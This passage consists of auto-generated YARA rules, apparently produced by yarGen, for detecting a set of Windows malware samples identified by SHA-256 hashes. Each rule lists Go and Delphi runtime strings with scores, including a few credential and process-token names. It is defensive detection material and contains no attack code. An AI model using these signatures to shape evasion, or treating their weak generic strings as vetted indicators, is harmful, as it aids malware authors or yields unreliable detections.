      description = "mw - from files 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash2 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "*windows.DLL" fullword ascii /* score: '20.00'*/
      $s2 = "log.(*Logger).formatHeader" fullword ascii /* score: '19.00'*/
      $s3 = "math.Log" fullword ascii /* score: '19.00'*/
      $s4 = "vendor/golang.org/x/net/idna.(*Profile).process" fullword ascii /* score: '18.00'*/
      $s5 = "sync.(*RWMutex).rUnlockSlow" fullword ascii /* score: '18.00'*/
      $s6 = "sync.(*RWMutex).RUnlock" fullword ascii /* score: '18.00'*/
      $s7 = "golang.org/x/sys/windows.getSystemDirectory" fullword ascii /* score: '18.00'*/
      $s8 = "vendor/golang.org/x/sys/cpu.processOptions" fullword ascii /* score: '18.00'*/
      $s9 = "golang.org/x/sys/windows.(*DLLError).Error" fullword ascii /* score: '18.00'*/
      $s10 = "golang.org/x/sys/windows.GetSystemDirectory" fullword ascii /* score: '18.00'*/
      $s11 = "doExecute" fullword ascii /* score: '18.00'*/
      $s12 = "golang.org/x/sys/windows.NewLazySystemDLL" fullword ascii /* score: '18.00'*/
      $s13 = "regexp.compileOnePass" fullword ascii /* score: '17.00'*/
      $s14 = "ABCDEFGHIJ" fullword ascii /* reversed goodware string 'JIHGFEDCBA' */ /* score: '16.50'*/
      $s15 = "math.Log2" fullword ascii /* score: '16.00'*/
      $s16 = "*windows.DLLError" fullword ascii /* score: '16.00'*/
      $s17 = "math.log2" fullword ascii /* score: '16.00'*/
      $s18 = "golang.org/x/sys/windows.(*LazyDLL).Load" fullword ascii /* score: '15.00'*/
      $s19 = "golang.org/x/sys/windows.(*DLL).FindProc" fullword ascii /* score: '15.00'*/
      $s20 = "vendor/golang.org/x/net/http/httpproxy.getEnvAny" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f_436ab377919038d7e080365c2ab42e0fe0a5536f77f72466308df088e4_1 {
   meta:
      description = "mw - from files 108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f, 436ab377919038d7e080365c2ab42e0fe0a5536f77f72466308df088e4ac037e"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "108051f4ef48cef2585d8d31248a751e64ab746028cae0296ca4f90a15ad2b5f"
      hash2 = "436ab377919038d7e080365c2ab42e0fe0a5536f77f72466308df088e4ac037e"
   strings:
      $s1 = "FExecuteAfterTimestamp" fullword ascii /* score: '18.00'*/
      $s2 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\sys\\System.SysUtils.pas" fullword wide /* score: '16.00'*/
      $s3 = "TComponent.GetObservers$0$Intf" fullword ascii /* score: '15.00'*/
      $s4 = "TComponent.GetObservers$1$Intf" fullword ascii /* score: '15.00'*/
      $s5 = "BTDictionary<System.TypInfo.PTypeInfo,System.string>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s6 = "BTDictionary<System.string,System.TypInfo.PTypeInfo>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s7 = "TComponent.GetObservers$ActRec" fullword ascii /* score: '15.00'*/
      $s8 = "BTDictionary<System.Pointer,System.Rtti.TRttiObject>.TKeyEnumeratorK" fullword ascii /* score: '15.00'*/
      $s9 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.TypInfo.pas" fullword wide /* score: '15.00'*/
      $s10 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.Generics.Defaults.pas" fullword wide /* score: '15.00'*/
      $s11 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.Rtti.pas" fullword wide /* score: '15.00'*/
      $s12 = "D:\\Embarcadero\\Studio\\22.0\\source\\rtl\\common\\System.Classes.pas" fullword wide /* score: '15.00'*/
      $s13 = "System.SysUtilsp" fullword ascii /* score: '14.00'*/
      $s14 = "4TList<System.Rtti.TPrivateHeap.THeapItem>.TEmptyFunc" fullword ascii /* score: '14.00'*/
      $s15 = " TList<System.Pointer>.TEmptyFunc" fullword ascii /* score: '14.00'*/
      $s16 = " TList<System.TObject>.TEmptyFunc" fullword ascii /* score: '14.00'*/
      $s17 = "System.Hash" fullword ascii /* score: '13.00'*/
      $s18 = "%TMethodImplementation.TInterceptFrameP" fullword ascii /* score: '12.00'*/
      $s19 = "GetPassphrase" fullword ascii /* score: '12.00'*/
      $s20 = "lpszPassWord" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e_90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c34_2 {
   meta:
      description = "mw - from files 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash2 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "runtime._GetProcessAffinityMask" fullword ascii /* score: '20.00'*/
      $s2 = "internal/poll.logInitFD" fullword ascii /* score: '19.00'*/
      $s3 = "internal/testlog.logger" fullword ascii /* score: '18.00'*/
      $s4 = "unicode.Scripts" fullword ascii /* score: '17.00'*/
      $s5 = "fmt.complexError" fullword ascii /* score: '17.00'*/
      $s6 = "internal/syscall/windows.procGetProcessMemoryInfo" fullword ascii /* score: '16.00'*/
      $s7 = "runtime._PostQueuedCompletionStatus" fullword ascii /* score: '15.00'*/
      $s8 = "os.ErrProcessDone" fullword ascii /* score: '15.00'*/
      $s9 = "__imp_SetProcessPriorityBoost" fullword ascii /* score: '15.00'*/
      $s10 = "runtime._GetQueuedCompletionStatusEx" fullword ascii /* score: '15.00'*/
      $s11 = "runtime._ExitProcess" fullword ascii /* score: '15.00'*/
      $s12 = "unicode.IDS_Binary_Operator" fullword ascii /* score: '15.00'*/
      $s13 = "runtime._SetProcessPriorityBoost" fullword ascii /* score: '15.00'*/
      $s14 = "unicode.Common" fullword ascii /* score: '14.00'*/
      $s15 = "internal/syscall/windows.procNetUserGetLocalGroups" fullword ascii /* score: '14.00'*/
      $s16 = "runtime._CreateIoCompletionPort" fullword ascii /* score: '13.00'*/
      $s17 = "unicode.Khitan_Small_Script" fullword ascii /* score: '13.00'*/
      $s18 = "unicode.FoldScript" fullword ascii /* score: '13.00'*/
      $s19 = "io.ErrClosedPipe" fullword ascii /* score: '13.00'*/
      $s20 = "unicode.Inscriptional_Parthian" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4_3 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash3 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash4 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash5 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash6 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s2 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s3 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s4 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s5 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s7 = "runtime.getlasterror" fullword ascii /* score: '18.00'*/
      $s8 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s9 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s10 = "SystemFuH" fullword ascii /* base64 encoded string 'K+-zan' */ /* score: '17.00'*/
      $s11 = "runqhead" fullword ascii /* score: '16.00'*/
      $s12 = "*syscall.DLL" fullword ascii /* score: '16.00'*/
      $s13 = "*sync.Mutex" fullword ascii /* score: '15.00'*/
      $s14 = "runtime.getPageSize" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s16 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s17 = "sync.(*Mutex).Lock" fullword ascii /* score: '15.00'*/
      $s18 = "runtime.mget" fullword ascii /* score: '15.00'*/
      $s19 = "runtime.isSweepDone" fullword ascii /* score: '15.00'*/
      $s20 = "runtime.getArgInfoFast" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4_4 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c, 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "41182cb1d67e92bc21b515ded820077c8068531e57ccd44d27ff30f5c4b9ae5c"
      hash3 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash4 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash5 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash6 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash7 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s12 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.(*rwmutex).rlock.func1" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.startTemplateThread" fullword ascii /* score: '17.00'*/
      $s15 = "runtime.templateThread" fullword ascii /* score: '17.00'*/
      $s16 = "runtime.putempty" fullword ascii /* score: '17.00'*/
      $s17 = "runtime.errorAddressString.Error" fullword ascii /* score: '16.00'*/
      $s18 = "runtime.deductSweepCredit" fullword ascii /* score: '15.00'*/
      $s19 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s20 = "runtime.pidleget" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_5 {
   meta:
      description = "mw - from files 0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "0d214808a672a6096734ee1bf66596f7a025e2dd7b9b51dba084d15782de8b4b"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash3 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "runtime.processorVersionInfo" fullword ascii /* score: '21.00'*/
      $s2 = "runtime.mutexprofilerate" fullword ascii /* score: '21.00'*/
      $s3 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s5 = "runtime.execLock" fullword ascii /* score: '19.00'*/
      $s6 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s7 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s8 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s9 = "runtime.printBacklogIndex" fullword ascii /* score: '18.00'*/
      $s10 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
      $s11 = "syscall.procCreateProcessAsUserW" fullword ascii /* score: '17.00'*/
      $s12 = "runtime.hashkey" fullword ascii /* score: '16.00'*/
      $s13 = "runtime.buildVersion.str" fullword ascii /* score: '16.00'*/
      $s14 = "syscall.procGetTempPathW" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.levelLogPages" fullword ascii /* score: '15.00'*/
      $s16 = "runtime._RtlGetNtVersionNumbers" fullword ascii /* score: '15.00'*/
      $s17 = "runtime.printBacklog" fullword ascii /* score: '15.00'*/
      $s18 = "runtime.fastlog2Table" fullword ascii /* score: '15.00'*/
      $s19 = "runtime.sweep" fullword ascii /* score: '15.00'*/
      $s20 = "runtime.faketime" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_6 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash3 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash4 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s2 = "os.executable" fullword ascii /* score: '16.00'*/
      $s3 = "*poll.fdMutex" fullword ascii /* score: '15.00'*/
      $s4 = "internal/poll.(*fdMutex).decref" fullword ascii /* score: '15.00'*/
      $s5 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
      $s6 = "reflect.Value.Complex" fullword ascii /* score: '14.00'*/
      $s7 = "internal/testlog.Getenv" fullword ascii /* score: '14.00'*/
      $s8 = "runtime.mapassign_fast64" fullword ascii /* score: '13.00'*/
      $s9 = "strconv.mulByLog10Log2" fullword ascii /* score: '12.00'*/
      $s10 = "strconv.mulByLog2Log10" fullword ascii /* score: '12.00'*/
      $s11 = "readbyte" fullword ascii /* score: '11.00'*/
      $s12 = "erroring" fullword ascii /* score: '11.00'*/
      $s13 = "strconv.AppendQuoteRune" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.netpollgoready" fullword ascii /* score: '10.00'*/
      $s15 = "*[]runtime.Frame" fullword ascii /* score: '10.00'*/
      $s16 = "reflect.Value.Int" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.return0" fullword ascii /* score: '10.00'*/
      $s18 = "strconv.AppendQuoteRuneToASCII" fullword ascii /* score: '10.00'*/
      $s19 = "*runtime.Frames" fullword ascii /* score: '10.00'*/
      $s20 = "*runtime.Frame" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_7 {
   meta:
      description = "mw - from files 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
   strings:
      $s1 = "syscall.GetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s2 = "*func(*os.Process) error" fullword ascii /* score: '18.00'*/
      $s3 = "C:/Program Files/Go/src/runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s4 = "os.(*Process).signal" fullword ascii /* score: '15.00'*/
      $s5 = "os.(*Process).done" fullword ascii /* score: '15.00'*/
      $s6 = "C:/Program Files/Go/src/internal/poll/fd_mutex.go" fullword ascii /* score: '15.00'*/
      $s7 = "os.(*Process).Signal" fullword ascii /* score: '15.00'*/
      $s8 = "*os.Process" fullword ascii /* score: '15.00'*/
      $s9 = "os.newProcess" fullword ascii /* score: '15.00'*/
      $s10 = "os.(*Process).kill" fullword ascii /* score: '15.00'*/
      $s11 = "C:/Program Files/Go/src/sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s12 = "os.(*Process).release" fullword ascii /* score: '15.00'*/
      $s13 = "os.(*Process).Release" fullword ascii /* score: '15.00'*/
      $s14 = "os.(*Process).Kill" fullword ascii /* score: '15.00'*/
      $s15 = "syscall.TerminateProcess" fullword ascii /* score: '14.00'*/
      $s16 = "GetUserProfileDirectory" fullword ascii /* score: '12.00'*/
      $s17 = "C:/Program Files/Go/src/os/executable.go" fullword ascii /* score: '12.00'*/
      $s18 = "C:/Program Files/Go/src/os/exec/lp_windows.go" fullword ascii /* score: '12.00'*/
      $s19 = "C:/Program Files/Go/src/os/exec.go" fullword ascii /* score: '12.00'*/
      $s20 = "C:/Program Files/Go/src/os/exec_windows.go" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_8 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash3 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash4 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      hash5 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "os.Executable" fullword ascii /* score: '20.00'*/
      $s2 = "os.commandLineToArgv" fullword ascii /* score: '16.00'*/
      $s3 = "internal/poll.(*fdMutex).increfAndClose" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.typehash" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.expandCgoFrames" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.interhash" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.nilinterhash" fullword ascii /* score: '13.00'*/
      $s9 = "sync.(*Pool).Get" fullword ascii /* score: '12.00'*/
      $s10 = "fmt.getField" fullword ascii /* score: '12.00'*/
      $s11 = "syscall.GetCommandLine" fullword ascii /* score: '11.00'*/
      $s12 = "sync/atomic.CompareAndSwapPointer" fullword ascii /* score: '11.00'*/
      $s13 = "internal/fmtsort.compare" fullword ascii /* score: '11.00'*/
      $s14 = "sync/atomic.CompareAndSwapUintptr" fullword ascii /* score: '11.00'*/
      $s15 = "runtime.(*Frames).Next" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.growWork_fast64" fullword ascii /* score: '10.00'*/
      $s17 = "runtime.goPanicSlice3C" fullword ascii /* score: '10.00'*/
      $s18 = "runtime.SetFinalizer" fullword ascii /* score: '10.00'*/
      $s19 = "reflect.mapiterkey" fullword ascii /* score: '10.00'*/
      $s20 = "runtime.panicSlice3C" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_9 {
   meta:
      description = "mw - from files 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash2 = "790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6"
      hash3 = "eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
   strings:
      $s1 = "*sync.RWMutex" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.selparkcommit" fullword ascii /* score: '13.00'*/
      $s3 = "os/exec.init.0" fullword ascii /* score: '12.00'*/
      $s4 = "os/exec.init.0.func1" fullword ascii /* score: '12.00'*/
      $s5 = "os/exec.init" fullword ascii /* score: '12.00'*/
      $s6 = "time.Date" fullword ascii /* score: '11.00'*/
      $s7 = "time.DatH" fullword ascii /* score: '11.00'*/
      $s8 = "internal/syscall/windows/registry.Key.GetMUIStringValue" fullword ascii /* score: '11.00'*/
      $s9 = "syscall.RegOpenKeyEx" fullword ascii /* score: '11.00'*/
      $s10 = "syscall.RegEnumKeyEx" fullword ascii /* score: '11.00'*/
      $s11 = "internal/syscall/windows/registry.Key.GetStringValue" fullword ascii /* score: '11.00'*/
      $s12 = "time.Time.date" fullword ascii /* score: '11.00'*/
      $s13 = "internal/syscall/windows/registry.Key.getValue" fullword ascii /* score: '11.00'*/
      $s14 = "runtime.netpollcheckerr" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.selectgo.func3" fullword ascii /* score: '10.00'*/
      $s16 = "runtime.mapaccess2_faststr" fullword ascii /* score: '10.00'*/
      $s17 = "time.Time.UTC" fullword ascii /* score: '10.00'*/
      $s18 = "runtime.GOROOT" fullword ascii /* score: '10.00'*/
      $s19 = "runtime.selunlock" fullword ascii /* score: '10.00'*/
      $s20 = "runtime.sellock" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365_497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b9_10 {
   meta:
      description = "mw - from files 33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365, 497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e, 90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "33c8ee21fb63ede72a217351f7faf1fa81f731dbe8fe46f3e9c9a6dbb6d7a365"
      hash2 = "497f6f7e21dd3e9622c7cd9f96bb5359284cd21c24ea3faa99520397b911a08e"
      hash3 = "90ef0ec74f1a5d49a9e605387dc8807bc8c6967ccfb5cc94678df73c340385ad"
   strings:
      $s1 = "_head_lib64_libmsvcrt_os_a" fullword ascii /* score: '9.00'*/
      $s2 = "__imp_GetConsoleMode" fullword ascii /* score: '9.00'*/
      $s3 = ".rdata$.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__" fullword ascii /* score: '7.00'*/
      $s4 = ".refptr.__RUNTIME_PSEUDO_RELOC_LIST__" fullword ascii /* score: '7.00'*/
      $s5 = ".rdata$.refptr.__RUNTIME_PSEUDO_RELOC_LIST__" fullword ascii /* score: '7.00'*/
      $s6 = "__gcc_register_frame" fullword ascii /* score: '7.00'*/
      $s7 = "register_frame_ctor" fullword ascii /* score: '7.00'*/
      $s8 = ".refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__" fullword ascii /* score: '7.00'*/
      $s9 = "__gcc_deregister_frame" fullword ascii /* score: '7.00'*/
      $s10 = ".rdata$.refptr.__xc_z" fullword ascii /* score: '4.00'*/
      $s11 = "__lib64_libmsvcrt_os_a_iname" fullword ascii /* score: '4.00'*/
      $s12 = ".rdata$.refptr.mingw_app_type" fullword ascii /* score: '4.00'*/
      $s13 = ".refptr.__native_startup_state" fullword ascii /* score: '4.00'*/
      $s14 = ".rdata$.refptr._CRT_MT" fullword ascii /* score: '4.00'*/
      $s15 = "__imp___acrt_iob_func" fullword ascii /* score: '4.00'*/
      $s16 = "__write_memory.part.0" fullword ascii /* score: '4.00'*/
      $s17 = ".refptr.__xi_a" fullword ascii /* score: '4.00'*/
      $s18 = ".rdata$.refptr.__xi_a" fullword ascii /* score: '4.00'*/
      $s19 = ".refptr.__native_startup_lock" fullword ascii /* score: '4.00'*/
      $s20 = ".rdata$.refptr.__native_startup_lock" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9_790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fe_11 {
   meta:
      description = "mw - from files 44a6bfbe74ebb6955080974ce84771dfbb353989fcb4109f691c9b33fca95cb9, 790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6, eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d51c795"
      author = "yarGen Rule Generator"
